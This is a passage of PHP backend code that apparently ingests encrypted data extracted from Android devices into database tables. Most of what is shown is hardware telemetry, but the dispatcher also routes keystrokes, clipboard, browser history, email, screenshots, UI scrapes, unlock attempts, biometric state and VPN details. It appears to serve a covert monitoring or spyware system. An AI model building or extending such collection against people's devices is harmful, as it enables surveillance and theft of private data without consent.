                    'detection_confidence' => $item['detection_confidence'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_extracted_screenshots')->insertBatch($batch);
            }

            log_message('info', '[parse_screenshots] Inserted ' . count($batch) . ' screenshots from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_screenshots] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ScreenStateExtractor
     * File prefix: screen_state_TIMESTAMP.enc
     */
    public function parse_screen_state(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'event_type' => $json['event_type'] ?? null,
                'timestamp' => $json['timestamp'] ?? null,
                'battery_level' => $json['battery_level'] ?? null,
                'unlock_method' => $json['unlock_method'] ?? null,
                'unlock_success' => $json['unlock_success'] ?? null,
                'failed_attempts' => $json['failed_attempts'] ?? null,
                'strong_auth_required' => isset($json['strong_auth_required']) ? ($json['strong_auth_required'] ? 1 : 0) : 0,
                'screen_brightness' => $json['screen_brightness'] ?? null,
                'auto_brightness' => isset($json['auto_brightness']) ? ($json['auto_brightness'] ? 1 : 0) : 0,
                'doze_state' => $json['doze_state'] ?? null,
                'keyguard_state' => $json['keyguard_state'] ?? null,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_screen_state')->insert($data);
            log_message('info', '[parse_screen_state] Inserted screen state snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_screen_state] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * VPNConfigExtractor
     * File prefix: vpn_config_TIMESTAMP.enc
     */
    public function parse_vpn_config(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $exists = $this->db->table('tbl_vpn_config')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $jsonEncode = function ($val) {
                return is_array($val) ? json_encode($val) : $val;
            };

            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'vpn_active' => isset($json['vpn_active']) ? ($json['vpn_active'] ? 1 : 0) : 0,
                'vpn_interface' => $json['vpn_interface'] ?? null,
                'vpn_dns_servers' => $jsonEncode($json['vpn_dns_servers'] ?? null),
                'vpn_routes' => $jsonEncode($json['vpn_routes'] ?? null),
                'vpn_mtu' => $json['vpn_mtu'] ?? null,
                'vpn_protocol' => $json['vpn_protocol'] ?? null,
                'vpn_is_always_on' => isset($json['vpn_is_always_on']) ? ($json['vpn_is_always_on'] ? 1 : 0) : 0,
                'vpn_is_lockdown' => isset($json['vpn_is_lockdown']) ? ($json['vpn_is_lockdown'] ? 1 : 0) : 0,
                'vpn_package' => $json['vpn_package'] ?? null,
                'vpn_label' => $json['vpn_label'] ?? null,
                'vpn_apps' => $jsonEncode($json['vpn_apps'] ?? null),
                'vpn_server' => $json['vpn_server'] ?? null,
                'vpn_port' => $json['vpn_port'] ?? null,
                'vpn_auth_type' => $json['vpn_auth_type'] ?? null,
                'vpn_ca_cert_sha256' => $json['vpn_ca_cert_sha256'] ?? null,
                'vpn_client_cert_sha256' => $json['vpn_client_cert_sha256'] ?? null,
                'vpn_dns_search_domains' => $jsonEncode($json['vpn_dns_search_domains'] ?? null),
                'vpn_excluded_apps' => $jsonEncode($json['vpn_excluded_apps'] ?? null),
                'vpn_included_apps' => $jsonEncode($json['vpn_included_apps'] ?? null),
                'vpn_block_non_vpn' => isset($json['vpn_block_non_vpn']) ? ($json['vpn_block_non_vpn'] ? 1 : 0) : 0,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_vpn_config')->insert($data);
            log_message('info', '[parse_vpn_config] Inserted VPN config snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_vpn_config] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * RunningProcessesDetailedExtractor
     * File prefix: running_processes_TIMESTAMP.enc
     */
    public function parse_running_processes(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['processes'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $proc) {
                $pid = $proc['pid'] ?? null;
                if ($pid === null) continue;

                $exists = $this->db->table('tbl_system_running_processes_detailed')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('pid', $pid)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'pid' => $pid,
                    'name' => $proc['name'] ?? null,
                    'ppid' => $proc['ppid'] ?? null,
                    'uid' => $proc['uid'] ?? null,
                    'importance' => $proc['importance'] ?? null,
                    'state' => $proc['state'] ?? null,
                    'tid' => $proc['tid'] ?? null,
                    'nice' => $proc['nice'] ?? null,
                    'threads' => $proc['threads'] ?? null,
                    'vsize_kb' => $proc['vsize_kb'] ?? null,
                    'vsize_peak_kb' => $proc['vsize_peak_kb'] ?? null,
                    'rss_kb' => $proc['rss_kb'] ?? null,
                    'pss_kb' => $proc['pss_kb'] ?? null,
                    'uss_kb' => $proc['uss_kb'] ?? null,
                    'swap_kb' => $proc['swap_kb'] ?? null,
                    'cpu_time_ms' => $proc['cpu_time_ms'] ?? null,
                    'cpu_time_user_ms' => $proc['cpu_time_user_ms'] ?? null,
                    'cpu_time_system_ms' => $proc['cpu_time_system_ms'] ?? null,
                    'start_time' => $proc['start_time'] ?? null,
                    'elapsed_time_ms' => $proc['elapsed_time_ms'] ?? null,
                    'processor' => $proc['processor'] ?? null,
                    'cmdline' => $proc['cmdline'] ?? null,
                    'gid' => $proc['gid'] ?? null,
                    'groups' => is_array($proc['groups'] ?? null) ? implode(',', $proc['groups']) : ($proc['groups'] ?? null),
                    'priority' => $proc['priority'] ?? null,
                    'fd_count' => $proc['fd_count'] ?? null,
                    'socket_count' => $proc['socket_count'] ?? null,
                    'wake_lock_count' => $proc['wake_lock_count'] ?? null,
                    'oom_score' => $proc['oom_score'] ?? null,
                    'oom_score_adj' => $proc['oom_score_adj'] ?? null,
                    'cgroup' => $proc['cgroup'] ?? null,
                    'selinux_context' => $proc['selinux_context'] ?? null,
                    'capabilities_eff' => $proc['capabilities_eff'] ?? null,
                    'capabilities_prm' => $proc['capabilities_prm'] ?? null,
                    'capabilities_inh' => $proc['capabilities_inh'] ?? null,
                    'capabilities_bnd' => $proc['capabilities_bnd'] ?? null,
                    'capabilities_amb' => $proc['capabilities_amb'] ?? null,
                    'seccomp_mode' => $proc['seccomp_mode'] ?? null,
                    'env_vars' => is_array($proc['env_vars'] ?? null) ? json_encode($proc['env_vars']) : ($proc['env_vars'] ?? null),
                    'signal_mask' => $proc['signal_mask'] ?? null,
                    'signal_pending' => $proc['signal_pending'] ?? null,
                    'signal_blocked' => $proc['signal_blocked'] ?? null,
                    'signal_ignored' => $proc['signal_ignored'] ?? null,
                    'signal_caught' => $proc['signal_caught'] ?? null,
                    'wake_channels' => $proc['wake_channels'] ?? null,
                    'timer_slack_ns' => $proc['timer_slack_ns'] ?? null,
                    'namespace' => $proc['namespace'] ?? null,
                    'open_files' => is_array($proc['open_files'] ?? null) ? json_encode($proc['open_files']) : ($proc['open_files'] ?? null),
                    'memory_maps' => is_array($proc['memory_maps'] ?? null) ? json_encode($proc['memory_maps']) : ($proc['memory_maps'] ?? null),
                    'stack_trace' => $proc['stack_trace'] ?? null,
                    'cputime_clock_id' => $proc['cputime_clock_id'] ?? null,
                    'cpu_percent' => $proc['cpu_percent'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_system_running_processes_detailed')->insertBatch($batch);
            }

            log_message('info', '[parse_running_processes] Inserted ' . count($batch) . ' detailed processes from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_running_processes] Exception: ' . $e->getMessage());
            return false;
        }
    }

/**
 * Parse misc_software composite JSON - splits into individual parsers
 */
public function parse_misc_software(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
{
    try {
        $json = $this->payloadToArray($file_name, $file_name);
        if ($json === null) {
            log_message('error', '[parse_misc_software] Failed to load payload: ' . $file_name);
            return false;
        }

        $data = $json['data'] ?? $json;
        $extractedAt = $json['timestamp'] ?? time() * 1000;

        $parserMap = [
            'calendar'         => 'parse_calendar',
            'accounts'         => 'parse_accounts',
            'security_audit'   => 'parse_security_audit',
            'accessibility'    => 'parse_accessibility',
            'input_methods'    => 'parse_input_methods',
            'data_usage'       => 'parse_data_usage',
            'saved_wifi'       => 'parse_saved_wifi',
            'default_apps'     => 'parse_default_apps',
            'alarms'           => 'parse_alarms',
            'app_security'     => 'parse_app_security',
            'network_security' => 'parse_network_security',
            'telephony_network'=> 'parse_telephony_network',
            'system_locale'    => 'parse_system_locale',
            'device_context'   => 'parse_device_context',
            'sim_configs'      => 'parse_sim_configs',
            'proc_info'        => 'parse_proc_info',
            'app_usage'        => 'parse_app_usage',
            'notifications'    => 'parse_notifications',
            'app_permissions'  => 'parse_app_permissions',
            'browser_history'  => 'parse_browser_history',
            'clipboard'        => 'parse_clipboard',
            'content_providers'=> 'parse_content_providers',
            'crash_logs'       => 'parse_crash_logs',
            'digital_wellbeing'=> 'parse_digital_wellbeing',
            'doze_standby'     => 'parse_doze_standby',
            'email'            => 'parse_email',
            'health_data'      => 'parse_health_data',
            'keyboard_input'   => 'parse_keyboard_input',
            'keyguard'         => 'parse_keyguard',
            'screenshots'      => 'parse_screenshots',
            'screen_state'     => 'parse_screen_state',
            'vpn_config'       => 'parse_vpn_config',
            'running_processes'=> 'parse_running_processes',
            'ui_scrape'        => 'parse_ui_scrape',
        ];

        foreach ($data as $subType => $subData) {
            if (isset($parserMap[$subType]) && method_exists($this, $parserMap[$subType])) {
                try {
                    $this->{$parserMap[$subType]}(array_merge([
                        'timestamp' => $extractedAt,
                        'extracted_at' => $extractedAt,
                    ], is_array($subData) ? $subData : [$subType => $subData]), $owner_id, $device_id, $fileRecordId);
                } catch (\Throwable $e) {
                    log_message('error', '[parse_misc_software] Sub-parser ' . $parserMap[$subType] . ' threw: ' . $e->getMessage());
                }
            }
        }

        return true;
    } catch (Exception $e) {
        log_message('error', '[parse_misc_software] Exception: ' . $e->getMessage());
        return false;
    }
}

    /**
     * AudioDeviceExtractor
     * File prefix: audio_devices_TIMESTAMP.enc
     */
    public function parse_audio_devices(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $exists = $this->db->table('tbl_telemetry_audio_devices')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $devices = $json['audio_devices'] ?? [];
            if (is_array($devices)) {
                $deviceBatch = [];
                foreach ($devices as $dev) {
                    $deviceBatch[] = [
                        'owner_id' => $owner_id,
                        'device_id' => $device_id,
                        'audio_device_id' => $dev['device_id'] ?? null,
                        'device_type' => $dev['device_type'] ?? null,
                        'address' => $dev['address'] ?? null,
                        'product_name' => $dev['product_name'] ?? null,
                        'is_sink' => isset($dev['is_sink']) ? ($dev['is_sink'] ? 1 : 0) : 0,
                        'is_source' => isset($dev['is_source']) ? ($dev['is_source'] ? 1 : 0) : 0,
                        'sample_rates' => is_array($dev['sample_rates'] ?? null) ? implode(',', $dev['sample_rates']) : ($dev['sample_rates'] ?? null),
                        'channel_masks' => is_array($dev['channel_masks'] ?? null) ? implode(',', $dev['channel_masks']) : ($dev['channel_masks'] ?? null),
                        'channel_counts' => is_array($dev['channel_counts'] ?? null) ? implode(',', $dev['channel_counts']) : ($dev['channel_counts'] ?? null),
                        'encoding' => $dev['encoding'] ?? null,
                        'format' => $dev['format'] ?? null,
                        'gain_min' => $dev['gain_min'] ?? null,
                        'gain_max' => $dev['gain_max'] ?? null,
                        'gain_step' => $dev['gain_step'] ?? null,
                        'latency_low_ms' => $dev['latency_low_ms'] ?? null,
                        'latency_high_ms' => $dev['latency_high_ms'] ?? null,
                        'supported_uid' => $dev['supported_uid'] ?? null,
                        'volume_handle' => $dev['volume_handle'] ?? null,
                        'extracted_at' => $extracted_at,
                        'created_at' => $dated,
                        'updated_at' => $dated,
                    ];
                }
                if (!empty($deviceBatch)) {
                    $this->db->table('tbl_telemetry_audio_devices')->insertBatch($deviceBatch);
                }
            }

            $volumes = $json['volumes'] ?? [];
            if (is_array($volumes)) {
                $volumeBatch = [];
                foreach ($volumes as $vol) {
                    $volumeBatch[] = [
                        'owner_id' => $owner_id,
                        'device_id' => $device_id,
                        'stream' => $vol['stream'] ?? null,
                        'volume_min' => $vol['volume_min'] ?? null,
                        'volume_max' => $vol['volume_max'] ?? null,
                        'volume_current' => $vol['volume_current'] ?? null,
                        'is_muted' => isset($vol['is_muted']) ? ($vol['is_muted'] ? 1 : 0) : 0,
                        'extracted_at' => $extracted_at,
                        'created_at' => $dated,
                    ];
                }
                if (!empty($volumeBatch)) {
                    $this->db->table('tbl_audio_volumes')->insertBatch($volumeBatch);
                }
            }

            log_message('info', '[parse_audio_devices] Inserted audio snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_audio_devices] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * BiometricExtractor
     * File prefix: biometric_TIMESTAMP.enc
     */
    public function parse_biometric(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $exists = $this->db->table('tbl_biometric')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'sensor_id' => $json['sensor_id'] ?? null,
                'sensor_type' => $json['sensor_type'] ?? null,
                'sensor_strength' => $json['sensor_strength'] ?? null,
                'vendor' => $json['vendor'] ?? null,
                'version' => $json['version'] ?? null,
                'max_enrollments' => $json['max_enrollments'] ?? null,
                'current_enrollments' => $json['current_enrollments'] ?? null,
                'enrolled_users' => is_array($json['enrolled_users'] ?? null) ? json_encode($json['enrolled_users']) : ($json['enrolled_users'] ?? null),
                'authenticator_id' => $json['authenticator_id'] ?? null,
                'challenge_counter' => $json['challenge_counter'] ?? null,
                'failed_attempts' => $json['failed_attempts'] ?? null,
                'lockout_time' => $json['lockout_time'] ?? null,
                'lockout_permanent' => isset($json['lockout_permanent']) ? ($json['lockout_permanent'] ? 1 : 0) : 0,
                'hardware_auth_token' => $json['hardware_auth_token'] ?? null,
                'crypto_object_supported' => isset($json['crypto_object_supported']) ? ($json['crypto_object_supported'] ? 1 : 0) : 0,
                'invalidated_by_reenrollment' => isset($json['invalidated_by_reenrollment']) ? ($json['invalidated_by_reenrollment'] ? 1 : 0) : 0,
                'has_enrollments' => isset($json['has_enrollments']) ? ($json['has_enrollments'] ? 1 : 0) : 0,
                'is_hardware_detected' => isset($json['is_hardware_detected']) ? ($json['is_hardware_detected'] ? 1 : 0) : 0,
                'is_hardware_available' => isset($json['is_hardware_available']) ? ($json['is_hardware_available'] ? 1 : 0) : 0,
                'enrollment_progress' => $json['enrollment_progress'] ?? null,
                'template_version' => $json['template_version'] ?? null,
                'device_secure' => isset($json['device_secure']) ? ($json['device_secure'] ? 1 : 0) : 0,
                'weak_auth_timeout_ms' => $json['weak_auth_timeout_ms'] ?? null,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_biometric')->insert($data);
            log_message('info', '[parse_biometric] Inserted biometric snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_biometric] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * GNSSHardwareExtractor
     * File prefix: gnss_hardware_TIMESTAMP.enc
     */
    public function parse_gnss_hardware(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $exists = $this->db->table('tbl_telemetry_gnss_hardware')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'gnss_id' => $json['gnss_id'] ?? null,
                'constellations_supported' => is_array($json['constellations_supported'] ?? null) ? json_encode($json['constellations_supported']) : ($json['constellations_supported'] ?? null),
                'antenna_type' => $json['antenna_type'] ?? null,
                'frequencies_supported' => is_array($json['frequencies_supported'] ?? null) ? json_encode($json['frequencies_supported']) : ($json['frequencies_supported'] ?? null),
                'max_satellites_tracked' => $json['max_satellites_tracked'] ?? null,
                'max_satellites_used' => $json['max_satellites_used'] ?? null,
                'agps_supported' => isset($json['agps_supported']) ? ($json['agps_supported'] ? 1 : 0) : 0,
                'agps_modes' => $json['agps_modes'] ?? null,
                'dead_reckoning_supported' => isset($json['dead_reckoning_supported']) ? ($json['dead_reckoning_supported'] ? 1 : 0) : 0,
                'raw_measurements_supported' => isset($json['raw_measurements_supported']) ? ($json['raw_measurements_supported'] ? 1 : 0) : 0,
                'correction_data_supported' => isset($json['correction_data_supported']) ? ($json['correction_data_supported'] ? 1 : 0) : 0,
                'navigation_messages_supported' => isset($json['navigation_messages_supported']) ? ($json['navigation_messages_supported'] ? 1 : 0) : 0,
                'antenna_info' => is_array($json['antenna_info'] ?? null) ? json_encode($json['antenna_info']) : ($json['antenna_info'] ?? null),
                'measurement_capabilities' => is_array($json['measurement_capabilities'] ?? null) ? json_encode($json['measurement_capabilities']) : ($json['measurement_capabilities'] ?? null),
                'status_supported' => isset($json['status_supported']) ? ($json['status_supported'] ? 1 : 0) : 0,
                'time_offset_ns' => $json['time_offset_ns'] ?? null,
                'leap_second' => $json['leap_second'] ?? null,
                'utc_time_accuracy_ns' => $json['utc_time_accuracy_ns'] ?? null,
                'gps_provider_available' => isset($json['gps_provider_available']) ? ($json['gps_provider_available'] ? 1 : 0) : 0,
                'gnss_hardware_model_id' => $json['gnss_hardware_model_id'] ?? null,
                'gnss_year_of_hardware' => $json['gnss_year_of_hardware'] ?? null,
                'gnss_batch_size' => $json['gnss_batch_size'] ?? null,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_telemetry_gnss_hardware')->insert($data);
            log_message('info', '[parse_gnss_hardware] Inserted GNSS snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_gnss_hardware] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * PowerRailExtractor
     * File prefix: power_rails_TIMESTAMP.enc
     */
    public function parse_power_rails(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['power_rails'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $rail) {
                $railName = $rail['rail_name'] ?? null;
                if (!$railName) continue;

                $exists = $this->db->table('tbl_telemetry_power_rails')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('rail_name', $railName)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'rail_name' => $railName,
                    'rail_type' => $rail['rail_type'] ?? null,
                    'voltage_mv' => $rail['voltage_mv'] ?? null,
                    'voltage_min_mv' => $rail['voltage_min_mv'] ?? null,
                    'voltage_max_mv' => $rail['voltage_max_mv'] ?? null,
                    'current_ma' => $rail['current_ma'] ?? null,
                    'current_max_ma' => $rail['current_max_ma'] ?? null,
                    'power_mw' => $rail['power_mw'] ?? null,
                    'temperature_c' => $rail['temperature_c'] ?? null,
                    'capacity_percent' => $rail['capacity_percent'] ?? null,
                    'status' => $rail['status'] ?? null,
                    'health' => $rail['health'] ?? null,
                    'technology' => $rail['technology'] ?? null,
                    'is_enabled' => isset($rail['is_enabled']) ? ($rail['is_enabled'] ? 1 : 0) : 0,
                    'regulator_type' => $rail['regulator_type'] ?? null,
                    'mode' => $rail['mode'] ?? null,
                    'efficiency_percent' => $rail['efficiency_percent'] ?? null,
                    'remote_sense' => isset($rail['remote_sense']) ? ($rail['remote_sense'] ? 1 : 0) : 0,
                    'soft_start_us' => $rail['soft_start_us'] ?? null,
                    'ramp_delay_us' => $rail['ramp_delay_us'] ?? null,
                    'constraints' => is_array($rail['constraints'] ?? null) ? json_encode($rail['constraints']) : ($rail['constraints'] ?? null),
                    'num_consumers' => $rail['num_consumers'] ?? null,
                    'consumer_names' => is_array($rail['consumer_names'] ?? null) ? json_encode($rail['consumer_names']) : ($rail['consumer_names'] ?? null),
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_telemetry_power_rails')->insertBatch($batch);
            }

            log_message('info', '[parse_power_rails] Inserted ' . count($batch) . ' power rails from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_power_rails] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * USBDeviceExtractor
     * File prefix: usb_devices_TIMESTAMP.enc
     */
    public function parse_usb_devices(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['usb_devices'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $dev) {
                $usbId = $dev['device_id'] ?? null;
                if ($usbId === null) continue;

                $exists = $this->db->table('tbl_telemetry_usb_devices')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('usb_device_id', $usbId)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'usb_device_id' => $usbId,
                    'vendor_id' => $dev['vendor_id'] ?? null,
                    'product_id' => $dev['product_id'] ?? null,
                    'device_class' => $dev['device_class'] ?? null,
                    'device_subclass' => $dev['device_subclass'] ?? null,
                    'device_protocol' => $dev['device_protocol'] ?? null,
                    'manufacturer_name' => $dev['manufacturer_name'] ?? null,
                    'product_name' => $dev['product_name'] ?? null,
                    'serial_number' => $dev['serial_number'] ?? null,
                    'version' => $dev['version'] ?? null,
                    'configuration_count' => $dev['configuration_count'] ?? null,
                    'interface_count' => $dev['interface_count'] ?? null,
                    'endpoint_count' => $dev['endpoint_count'] ?? null,
                    'power_ma' => $dev['power_ma'] ?? null,
                    'speed' => $dev['speed'] ?? null,
                    'is_charging' => isset($dev['is_charging']) ? ($dev['is_charging'] ? 1 : 0) : 0,
                    'is_debug_accessory' => isset($dev['is_debug_accessory']) ? ($dev['is_debug_accessory'] ? 1 : 0) : 0,
                    'is_audio_accessory' => isset($dev['is_audio_accessory']) ? ($dev['is_audio_accessory'] ? 1 : 0) : 0,
                    'is_midi' => isset($dev['is_midi']) ? ($dev['is_midi'] ? 1 : 0) : 0,
                    'is_adb' => isset($dev['is_adb']) ? ($dev['is_adb'] ? 1 : 0) : 0,
                    'connected_time' => $dev['connected_time'] ?? null,
                    'disconnected_time' => $dev['disconnected_time'] ?? null,
                    'total_bytes_transferred' => $dev['total_bytes_transferred'] ?? null,
                    'has_permission' => isset($dev['has_permission']) ? ($dev['has_permission'] ? 1 : 0) : 0,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_telemetry_usb_devices')->insertBatch($batch);
            }

            log_message('info', '[parse_usb_devices] Inserted ' . count($batch) . ' USB devices from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_usb_devices] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * VibrationExtractor
     * File prefix: vibration_TIMESTAMP.enc
     */
    public function parse_vibration(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $exists = $this->db->table('tbl_telemetry_vibration')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'has_vibrator' => isset($json['has_vibrator']) ? ($json['has_vibrator'] ? 1 : 0) : 0,
                'supports_amplitude_control' => isset($json['supports_amplitude_control']) ? ($json['supports_amplitude_control'] ? 1 : 0) : 0,
                'supports_frequency_control' => isset($json['supports_frequency_control']) ? ($json['supports_frequency_control'] ? 1 : 0) : 0,
                'actuator_id' => $json['actuator_id'] ?? null,
                'max_amplitude' => $json['max_amplitude'] ?? null,
                'resonant_frequency_hz' => $json['resonant_frequency_hz'] ?? null,
                'q_factor' => $json['q_factor'] ?? null,
                'actuator_type' => $json['actuator_type'] ?? null,
                'primitives' => is_array($json['primitives'] ?? null) ? json_encode($json['primitives']) : ($json['primitives'] ?? null),
                'frequency_range_hz' => is_array($json['frequency_range_hz'] ?? null) ? json_encode($json['frequency_range_hz']) : ($json['frequency_range_hz'] ?? null),
                'composite_primitives' => is_array($json['composite_primitives'] ?? null) ? json_encode($json['composite_primitives']) : ($json['composite_primitives'] ?? null),
                'supports_external_control' => isset($json['supports_external_control']) ? ($json['supports_external_control'] ? 1 : 0) : 0,
                'braking_supported' => isset($json['braking_supported']) ? ($json['braking_supported'] ? 1 : 0) : 0,
                'envelope_supported' => isset($json['envelope_supported']) ? ($json['envelope_supported'] ? 1 : 0) : 0,
                'pwm_supported' => isset($json['pwm_supported']) ? ($json['pwm_supported'] ? 1 : 0) : 0,
                'waveform_supported' => isset($json['waveform_supported']) ? ($json['waveform_supported'] ? 1 : 0) : 0,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_telemetry_vibration')->insert($data);
            log_message('info', '[parse_vibration] Inserted vibration snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_vibration] Exception: ' . $e->getMessage());
            return false;
        }
    }

/**
 * Parse misc_hardware composite JSON - splits into individual parsers
 */
public function parse_misc_hardware(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
{
    try {
        $json = $this->payloadToArray($file_name, $file_name);
        if ($json === null) {
            log_message('error', '[parse_misc_hardware] Failed to load payload: ' . $file_name);
            return false;
        }

        $data = $json['data'] ?? $json;
        $extractedAt = $json['timestamp'] ?? time() * 1000;

        $parserMap = [
            'hardware_graphics' => 'parse_hardware_graphics',
            'hardware_network'  => 'parse_hardware_network',
            'camera_info'       => 'parse_camera_info',
            'battery_stats'     => 'parse_battery_stats',
            'sensors'           => 'parse_sensors',
            'bluetooth'         => 'parse_bluetooth',
            'network_info'      => 'parse_network_info',
            'cell_towers'       => 'parse_cell_towers',
            'display_info'      => 'parse_display_info',
            'storage'           => 'parse_storage',
            'thermal'           => 'parse_thermal',
            'nfc'               => 'parse_nfc',
            'processes'         => 'parse_processes',
            'audio_devices'     => 'parse_audio_devices',
            'biometric'         => 'parse_biometric',
            'gnss_hardware'     => 'parse_gnss_hardware',
            'power_rails'       => 'parse_power_rails',
            'usb_devices'       => 'parse_usb_devices',
            'vibration'         => 'parse_vibration',
        ];

        foreach ($data as $subType => $subData) {
            if (isset($parserMap[$subType]) && method_exists($this, $parserMap[$subType])) {
                try {
                    $this->{$parserMap[$subType]}(array_merge([
                        'timestamp' => $extractedAt,
                        'extracted_at' => $extractedAt,
                    ], is_array($subData) ? $subData : [$subType => $subData]), $owner_id, $device_id, $fileRecordId);
                } catch (\Throwable $e) {
                    log_message('error', '[parse_misc_hardware] Sub-parser ' . $parserMap[$subType] . ' threw: ' . $e->getMessage());
                }
            }
        }

        return true;
    } catch (Exception $e) {
        log_message('error', '[parse_misc_hardware] Exception: ' . $e->getMessage());
        return false;
    }
    }

    /**
